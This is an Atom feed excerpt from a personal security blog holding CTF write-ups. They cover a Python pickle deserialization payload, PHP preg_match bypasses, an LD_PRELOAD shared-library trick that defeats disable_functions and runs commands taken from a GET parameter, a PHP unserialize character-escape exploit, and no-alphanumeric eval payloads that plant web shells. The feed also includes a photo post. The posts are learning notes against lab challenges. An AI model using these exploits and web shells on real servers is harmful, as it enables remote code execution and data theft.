+<p>找到密钥直接伪造<a href="https://jwt.io/">jwt.io</a><br>
+<img src="https://skyblu3519.github.io/post-images/1688292100574.png" alt="" loading="lazy"></p>
+<p>F12找到源码<code>/static/asd1f654e683wq/www.zip</code></p>
+<p>路由定义在<code>/sshop/views/__init__.py</code></p>
+<pre><code class="language-python">from Shop import *
+from User import *
+from Admin import *
+
+
+handlers = [
+    (r'/', ShopIndexHandler),
+    (r'/shop', ShopListHandler),
+    (r'/info/(\d+)', ShopDetailHandler),
+    (r'/shopcar', ShopCarHandler),
+    (r'/shopcar/add', ShopCarAddHandler),
+    (r'/pay', ShopPayHandler),
+    (r'/user', UserInfoHandler),
+    (r'/user/change', changePasswordHandler),
+    (r'/pass/reset', ResetPasswordHanlder),
+    (r'/login', UserLoginHanlder),
+    (r'/logout', UserLogoutHandler),
+    (r'/register', RegisterHandler),
+    (r'/b1g_m4mber', AdminHandler)
+]
+</code></pre>
+<p>后门放在<code>AdminHandler</code>中，一眼反序列化<br>
+<img src="https://skyblu3519.github.io/post-images/1688292135756.png" alt="" loading="lazy"></p>
+<p>原理之后学学，这里先跟着打一遍。</p>
+<p>python2.7生成payload</p>
+<pre><code class="language-python">import os
+import pickle
+import urllib
+
+class exp(object):
+    def __reduce__(self):
+        return (eval,(&quot;open('/flag.txt').read()&quot;,))
+
+a=exp()
+s=pickle.dumps(a)
+print urllib.quote(s)
+# c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
+</code></pre>
+<p><code>/b1g_m4mber</code>页面点击抓包<br>
+<img src="https://skyblu3519.github.io/post-images/1688292145192.png" alt="" loading="lazy"></p>
+<p>修改<code>become</code>，get flag!!!!<br>
+<img src="https://skyblu3519.github.io/post-images/1688292174201.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PHP Trick 之 preg_match(/^.*/)]]></title>
+        <id>https://skyblu3519.github.io/post/php-trick-zhi-preg_match/</id>
+        <link href="https://skyblu3519.github.io/post/php-trick-zhi-preg_match/">
+        </link>
+        <updated>2023-07-02T06:36:04.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>I hate Regex</p>
+</blockquote>
+<p>快速笔记</p>
+<h1 id="换行绕过">换行绕过</h1>
+<p>如果<code>preg_match</code>用<code>^</code>对开头进行界定的话，那么它只会为输入的第一行进行检测，进而可以通过输入多行进行绕过：</p>
+<pre><code class="language-php">&lt;?php
+$myinput=&quot;aaaaaaa\n11111111&quot;; //Notice the new line
+echo preg_match(&quot;/1/&quot;,$myinput);
+//1  --&gt; In this scenario preg_match find the char &quot;1&quot;
+echo preg_match(&quot;/1.*$/&quot;,$myinput);
+//1  --&gt; In this scenario preg_match find the char &quot;1&quot;
+echo preg_match(&quot;/^.*1/&quot;,$myinput);
+//0  --&gt; In this scenario preg_match DOESN'T find the char &quot;1&quot;
+echo preg_match(&quot;/^.*1.*$/&quot;,$myinput);
+//0  --&gt; In this scenario preg_match DOESN'T find the char &quot;1&quot;
+</code></pre>
+<p>如果接收的是JSON格式的数据，可以多输入几行：</p>
+<pre><code class="language-json">{
+  &quot;cmd&quot;: &quot;cat /etc/passwd&quot;
+}
+</code></pre>
+<h1 id="长度绕过">长度绕过</h1>
+<p>这个的利用原理是pcre设定了一个正则匹配溯次数上限<code>pcre.backtrack_limit</code>，可以用<code>var_dump(ini_get('pcre.backtrack_limit'));</code>的方式查看当前环境下的上限：<br>
+<img src="https://skyblu3519.github.io/post-images/1688280760495.png" alt="" loading="lazy"></p>
+<p>通过发送超长字符串的方式，使正则执行失败，进而绕过限制。</p>
+<pre><code class="language-php">&lt;?php
+$json = '{&quot;cmd&quot;: &quot;cat /flag&quot;, &quot;injected&quot;: &quot;'. str_repeat(&quot;a&quot;, 10000000) .'&quot;}';
+//echo $json.&quot;\n&quot;;
+if (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
+    echo 'preg_match detected&lt;br/&gt;&lt;br/&gt;';
+} else {
+    $cmd = json_decode($json, true)['cmd'];
+    echo $cmd;  // cat /flag
+}
+</code></pre>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a><br>
+<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-.">PHP Tricks!</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[LD_PRELOAD绕过disable_function]]></title>
+        <id>https://skyblu3519.github.io/post/ld_preload-rao-guo-disable_function/</id>
+        <link href="https://skyblu3519.github.io/post/ld_preload-rao-guo-disable_function/">
+        </link>
+        <updated>2023-07-01T07:04:14.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="背景知识">背景知识</h1>
+<h2 id="ld_preload">LD_PRELOAD</h2>
+<p>LD_PRELOAD是一个由动态链接器（dynamic linker）识别的特殊环境变量，它可以让你指定在程序运行时优先加载的动态库（dynamic library）。</p>
+<p>LD_PRELOAD列表中的库会在程序运行时加载，并且在任何其他库之前加载。这样，它们就可以覆盖其他库的函数，例如C库（libc）的函数。</p>
+<h2 id="静态链接库">静态链接库</h2>
+<p>静态链接是在编译阶段将库的代码嵌入到目标可执行文件中。也就是说，库中的函数和数据被复制到生成的可执行文件中。因此，静态链接产生的可执行文件可以独立运行，不依赖于任何外部库。静态链接库的扩展名通常为 .a（在 Unix 系统下）或 .lib（在 Windows 系统下）。</p>
+<h2 id="动态链接库">动态链接库</h2>
+<p>动态链接库（也称为共享库）与静态链接库不同。当你使用动态链接库编译程序时，库的代码不会被嵌入到可执行文件中。取而代之的是，在<strong>运行时</strong>，<strong>动态链接器</strong>（如 Unix 系统下的 ld.so 或 ld-linux.so）会负责加载库并将其链接到可执行文件。这些信息存储在程序的头部。然后，动态链接器会搜索这些库，并将它们加载到内存中。</p>
+<p>当库被加载到内存后，动态链接器会解析程序中的符号（即函数和变量的名字）。对于每一个未定义的符号，动态链接器会在加载的库中查找这个符号，并建立链接。这个过程被称为重定位。</p>
+<p>一旦所有的符号都被解析并链接，程序就可以开始执行了。在程序执行过程中，如果它调用了一个库中的函数，CPU 会跳转到这个函数在内存中的地址。这个地址在重定位阶段已经被确定。</p>
+<h1 id="攻击思路">攻击思路</h1>
+<h2 id="本地劫持">本地劫持</h2>
+<p>一个帮助理解的例子，以<code>id</code>为例。</p>
+<p>strace跟踪id的实际调用情况<br>
+<img src="https://skyblu3519.github.io/post-images/1688200036977.png" alt="" loading="lazy"></p>
+<p>劫持<code>geteuid</code>函数，首先编写<code>hack.c</code>，其中准备好劫持<code>geteuid</code>的同名函数</p>
+<pre><code class="language-c">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+void payload() {
+        system(&quot;ls / &gt; ./skky&quot;);
+}
+int geteuid() 
+{
+    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    payload();
+}
+</code></pre>
+<p>然后使用 GCC 编译器来编译 C 语言源文件（hack.c），然后链接生成一个共享库（hack.so）</p>
+<pre><code class="language-shell">gcc -c -fPIC hack.c -o hack
+gcc --share hack -o hack.so
+</code></pre>
+<p>其中：</p>
+<ul>
+<li>fPIC：这个选项告诉 GCC 生成位置无关代码（Position Independent Code）。这是生成动态库（dynamic library）或共享库（shared library）所需要的，因为这种库可以被加载到任何内存地址，而不需要重新定位。</li>
+<li>share：这个选项告诉 GCC 生成一个共享库而不是一个可执行程序。</li>
+</ul>
+<p>准备好这个恶意共享库后，就可以配置<code>LD_PRELOAD</code>环境变量为共享库的路径，紧接着在执行<code>LD_PRELOAD=./hack.so id</code>来调用到这个被覆盖后的<code>geteuid</code>函数<br>
+<img src="https://skyblu3519.github.io/post-images/1688201336484.png" alt="" loading="lazy"></p>
+<h2 id="php劫持">PHP劫持</h2>
+<p>在已有的文章中显示，一般使用php中的<code>mail()</code>函数进行触发</p>
+<pre><code class="language-php">&lt;?php
+mail('','','','');
+?&gt;
+</code></pre>
+<p>strace这个脚本<code>strace php demo.php</code>，发现程序会启子进程来调用<code>sendmail</code>，而<code>sendmail</code>又使用了<code>geteuid</code>函数。于是我们可以像刚刚那样劫持<code>geteuid</code>来执行命令。</p>
+<p>使用PHP<code>putenv()</code>函数来设置<code>LD_PRELOAD=./hack.so</code></p>
+<pre><code class="language-php">&lt;?php
+putenv('LD_PRELOAD=./hack.so');
+mail('','','','');
+?&gt;
+</code></pre>
+<p>运行这个脚本即可<br>
+<img src="https://skyblu3519.github.io/post-images/1688207559542.png" alt="" loading="lazy"></p>
+<p>但如果没有<code>sendmail</code>呢（我的kali就没有装）？事实上只能劫持某个特定的函数也挺麻烦的，不过还有一种更万能的方法。使用下面的代码，来制作我们的共享库：</p>
+<pre><code class="language-c">#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+__attribute__ ((__constructor__)) void angel (void){
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    system(&quot;ls&quot;);
+}
+</code></pre>
+<p>其中<code>__attribute__ ((__constructor__))</code>有如下说明：</p>
+<ol>
+<li>It's run when a shared library is loaded, typically during program startup.</li>
+<li>That's how all GCC attributes are; presumably to distinguish them from function calls.</li>
+<li>The destructor is run when the shared library is unloaded, typically at program exit.</li>
+</ol>
+<p>这会在一开始加载动态库的时候，执行<code>__attribute__ ((__constructor__))</code>，进而RCE。</p>
+<p><code>LD_PRELOAD</code>是在脚本中设置的，它可以影响到加载它的进程及其子进程。为了触发加载动态库这一动作，我们必须找到一个能在运行时候启动子进程的函数才行，如果能启动一个子进程，那么我们的设置的<code>LD_PRELOAD</code>就会加载我们的evil shared library。</p>
+<p>使用 <code>strace</code> 命令的 <code>-f</code>来追踪<code>mail</code>函数的所有调用，启动子进程的系统调用通常有 fork, vfork, clone, execve 等，比如：<code>pid 12345 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f8babb6ea10) = 12346</code>。很显然，<code>mail</code>函数在运行时是启动了子进程的<br>
+<img src="https://skyblu3519.github.io/post-images/1688208873686.png" alt="" loading="lazy"></p>
+<p>将刚刚的C代码编译为动态库<code>neo.so</code>，现在我们来执行这个脚本：</p>
+<pre><code class="language-php">&lt;?php
+putenv(&quot;LD_PRELOAD=./neo.so&quot;);
+mail('','','','');
+?&gt;
+</code></pre>
+<p>成功RCE<br>
+<img src="https://skyblu3519.github.io/post-images/1688209151091.png" alt="" loading="lazy"></p>
+<h2 id="增加一点实用性">增加一点实用性</h2>
+<p>让执行的命令从环境变量中动态获取</p>
+<pre><code class="language-c">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+__attribute__ ((constructor)) void angel (void){
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    char* cmd = getenv(&quot;MY_CMD&quot;);
+    system(cmd);
+}
+</code></pre>
+<p>在PHP中设置环境变量从GET参数中获取</p>
+<pre><code class="language-php">&lt;?php
+$a = $_GET['cmd'];
+$cmd = &quot;$a &gt; /tmp/hackerfile&quot;;
+@putenv(&quot;MY_CMD=&quot;.$cmd);
+putenv(&quot;LD_PRELOAD=/tmp/hack.so&quot;);
+mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
+echo file_get_contents('/tmp/hackerfile');
+?&gt;
+</code></pre>
+<h1 id="极客大挑战-2019rce-me">[极客大挑战 2019]RCE ME</h1>
+<p>继续上周的内容，现在用LD_PRELOAD绕过<code>disable_function</code>。</p>
+<p>在用<code>?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%94%86%A2%D6%D6)</code>拿到shell之后，发现<code>/flag</code>为空，get flag需要执行<code>/readflag</code>。</p>
+<p>Ps.对于上周遗留的问题，这两个括号的作用很可能有两个：</p>
+<ul>
+<li>用于标记取反计算的范围</li>
+<li>PHP7执行函数的一个格式<code>(function)(argv)</code>，eg：<code>(phpinfo)()</code>。另外<code>('phpinfo')()</code>这样在函数名前加上引号也是可以的。</li>
+</ul>
+<p>但是由于<code>disable_functions</code>的限制，这个webshell并不能执行命令<br>
+<img src="https://skyblu3519.github.io/post-images/1688222858338.png" alt="" loading="lazy"></p>
+<p>用LD_PRELOAD绕过，在<code>/tmp</code>目录下上传编译好的共享库<code>hack.so</code>和<code>hack.php</code><br>
+<img src="https://skyblu3519.github.io/post-images/1688223177573.png" alt="" loading="lazy"></p>
+<p>用<code>sky</code>参数执行代码包含<code>/tmp/hack.php</code>，在用<code>cmd</code>参数执行<code>/readflag</code>，命令的结果会被保存在<code>/tmp/hackerfile</code>，同时在页面中读取出来。<br>
+<img src="https://skyblu3519.github.io/post-images/1688223603219.png" alt="" loading="lazy"></p>
+<p>最后，ARM上编译的库无法在x86中执行！因为这坑浪费了好多时间QAQ</p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://www.anquanke.com/post/id/175403">深入浅出LD_PRELOAD &amp; putenv()</a><br>
+<a href="https://blog.csdn.net/xia739635297/article/details/104641082/">【PHP绕过】LD_PRELOAD bypass disable_functions</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Something changed in the Summer time.]]></title>
+        <id>https://skyblu3519.github.io/post/something-changed-in-the-summer-time/</id>
+        <link href="https://skyblu3519.github.io/post/something-changed-in-the-summer-time/">
+        </link>
+        <updated>2023-06-30T17:12:48.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>ins: Cryborg</p>
+</blockquote>
+<p>又到天黑<br>
+<img src="https://skyblu3519.github.io/post-images/1688145302908.jpeg" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688145313868.jpeg" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688145335733.jpeg" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688145347917.jpeg" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688145440771.jpeg" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688145456441.jpeg" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688145477032.jpeg" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688145313868.jpeg" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688145492839.jpeg" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[一周CTF（三）]]></title>
+        <id>https://skyblu3519.github.io/post/mei-zhou-ctfsan/</id>
+        <link href="https://skyblu3519.github.io/post/mei-zhou-ctfsan/">
+        </link>
+        <updated>2023-06-27T17:01:19.000Z</updated>
+        <content type="html"><![CDATA[<p>ababababababababababababababa</p>
+<h1 id="buu">BUU</h1>
+<h2 id="0ctf-2016piapiapia">[0CTF 2016]piapiapia</h2>
+<p>首先用dirsearch扫下目录，不过buu的题目一扫就是429，所以直接查wp找到泄露的文件。</p>
+<p>如果要自己扫的话，可以调低线程，同时设置扫描的延时：</p>
+<pre><code>python dirsearch.py -u http://403a7d8f-39ff-43e0-9fab-38981c17289f.node4.buuoj.cn:81/  -e php,htm,js,bak,zip,tgz,txt -s 1 -t 5 -i 200
+</code></pre>
+<p>找到泄露的源码<code>www.zip</code><br>
+<img src="https://skyblu3519.github.io/post-images/1687885387803.png" alt="" loading="lazy"></p>
+<p>审计源码，在<code>config.php</code>处有<code>$flag</code>，不过已经删除了。<code>profile.php</code>中有<code>unserialize</code>和<code>file_get_contents</code>，一看就是关键点。<br>
+<img src="https://skyblu3519.github.io/post-images/1687885406068.png" alt="" loading="lazy"></p>
+<p>目的是通过<code>file_get_contents</code>去读<code>config.php</code>获得flag，<code>file_get_contents</code>所读取的文件名的获取方式：<code>$profile['photo']</code>&lt;-<code>unserialize($profile)</code>&lt;-<code>$user-&gt;show_profile($username) // 查询表</code>&lt;-<code>$user-&gt;update_profile($username, serialize($profile)) // 更新表</code></p>
+<p><code>$profile</code>的获取方式<br>
+<img src="https://skyblu3519.github.io/post-images/1687885428029.png" alt="" loading="lazy"></p>
+<p><code>$user-&gt;update_profile</code>对插入数据的检查方式：<br>
+<img src="https://skyblu3519.github.io/post-images/1687885463276.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1687885472568.png" alt="" loading="lazy"></p>
+<p>文件名会被md5不可控，但是nickname没有太多的限制。关键点：对输入的check在其序列化之后，且方式为字符替换。这就是之前的反序列化字符逃逸。</p>
+<p><code>where</code>被替换为<code>hacker</code>字符串长度变长，所以可以在nickname中构造<code>photo</code>属性，再把其“挤”出来。对于<code>strlen($_POST['nickname']) &gt; 10</code>长度限制，可以通过数组绕过，不过这样<code>$profile['nickname']</code>会变成一个数组。</p>
+<pre><code class="language-php">&lt;?php
+$nick[] = 'skye';
+$profile['nickname'] = $nick;
+$profile['photo'] = '';
+$s = serialize($profile);
+echo $s.&quot;\n&quot;;       # a:2:{s:8:&quot;nickname&quot;;a:1:{i:0;s:4:&quot;skye&quot;;}s:5:&quot;photo&quot;;s:0:&quot;&quot;;}
+$safe = array('select', 'insert', 'update', 'delete', 'where');
+$safe = '/' . implode('|', $safe) . '/i';
+$s = preg_replace($safe, 'hacker', $s);
+
+$a = unserialize($s);
+print_r($a);
+//Array
+//(
+//    [nickname] =&gt; Array
+//    (
+//        [0] =&gt; 
+//        )
+//
+//    [photo] =&gt; 
+//)
+</code></pre>
+<p>为了闭合nickname的数组类型，构造所要逃逸的字符串：<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>，其长度为34，所以前面要加上34个<code>where</code>。</p>
+<pre><code class="language-php">&lt;?php
+$nick[] = 'where...where&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}';		# 34个where
+$profile['nickname'] = $nick;
+$profile['photo'] = '';
+$s = serialize($profile);
+
+$safe = array('select', 'insert', 'update', 'delete', 'where');
+$safe = '/' . implode('|', $safe) . '/i';
+$s = preg_replace($safe, 'hacker', $s);
+
+$a = unserialize($s);
+print_r($a);
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1687885513159.png" alt="" loading="lazy"></figure>
+<p>抓包修改<br>
+<img src="https://skyblu3519.github.io/post-images/1687885522616.png" alt="" loading="lazy"></p>
+<p>在<code>profile.php</code>得到base64后的<code>config.php</code>，get flag。</p>
+<h2 id="极客大挑战-2019rce-me">[极客大挑战 2019]RCE ME</h2>
+<p>关键词：无数字字母RCE。参考链接：<a href="https://blog.csdn.net/qq_61778128/article/details/127063407">无数字字母rce总结</a></p>
+<p>虽然这道题有一个长度的限制，但也差不多。</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+if(isset($_GET['code'])){
+            $code=$_GET['code'];
+                    if(strlen($code)&gt;40){
+                                        die(&quot;This is too Long.&quot;);
+                                                }
+                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){
+                                        die(&quot;NO.&quot;);
+                                                }
+                    @eval($code);
+}
+else{
+            highlight_file(__FILE__);
+}
+</code></pre>
+<p>rce的构造有两种，一个取反、一个异或。先说取反，本质上都是用PHP可变函数的特性。</p>
+<p>取反</p>
+<pre><code class="language-php">$a = urlencode(~('eval($_POST[sky])'));
+$b = urlencode(~('assert'));
+echo $a.&quot;\n&quot;;
+echo $b;
+// payload: ?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%94%86%A2%D6);
+</code></pre>
+<p>异或：</p>
+<pre><code class="language-python">valid = &quot;!@$%^*(){}[];\'\&quot;,.&lt;&gt;/?-=_`~ &quot;
+answer = 'phpinfo'
+tmp1, tmp2 = '', ''
+
+for c in answer:
+  for i in valid:
+    for j in valid:
+      if (ord(i) ^ ord(j) == ord(c)):
+        tmp1 += i
+        tmp2 += j
+        break
+    else:
+      continue
+    break
+print(&quot;tmp1为:&quot;, tmp1)
+print(&quot;tmp2为:&quot;, tmp2)
+
+# payload: ?code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])
+</code></pre>
+<p>虽然不是很难，但还是有几个点想了很久。首先是取反的构造，这里我可以理解它最后是在<code>eval</code>中执行的是<code>('assert')('eval($_POST[sky])');</code>这样一个字符串，但没太理解第一个<code>assert</code>的括号是什么作用，为什么<code>~%9E%8C%8C%9A%8D%8B(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%94%86%A2%D6);</code>这样的payload是无效的。还有，再次提醒，<code>eval</code>不是函数，所以这里不能作为可变函数调用。</p>
+<p>在异或的构造方式中学到了，<code>${}</code>是一个变量解析的语法，用于创建动态变量名。这个语法的一般形式是<code>${expression}</code>，其中<code>expression</code>是返回字符串的任何合法 PHP 表达式。一个简单的例子：</p>
+<pre><code class="language-php">$a = 'phpinfo';
+${'a'}();
+</code></pre>
+<p>所以payload中的意思是：<code>$_GET[_]($_GET[___)</code></p>
+<p>回到题目，拿到shell之后，由于<code>disable_functions</code>的限制不能直接读到flag，要用到的方法是<code>LD_preload</code>，这个之后详细了解一下，就先记下用蚁剑的解法。</p>
+<p>右键shell，在插件市场中下载<code>绕过disable_functions</code>插件<br>
+<img src="https://skyblu3519.github.io/post-images/1687885624151.png" alt="" loading="lazy"></p>
+<p>加载插件<br>
+<img src="https://skyblu3519.github.io/post-images/1687885631124.png" alt="" loading="lazy"></p>
+<p>选择<code>PHP7_GC_UAF</code><br>
+<img src="https://skyblu3519.github.io/post-images/1687885639707.png" alt="" loading="lazy"></p>
+<p>点击开始之后，执行<code>/readflag</code><br>
+<img src="https://skyblu3519.github.io/post-images/1687885646135.png" alt="" loading="lazy"></p>
+<h1 id="总结">总结</h1>
+<p>回家真好～<br>
+<img src="https://skyblu3519.github.io/post-images/1687885754650.jpeg" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+</feed>
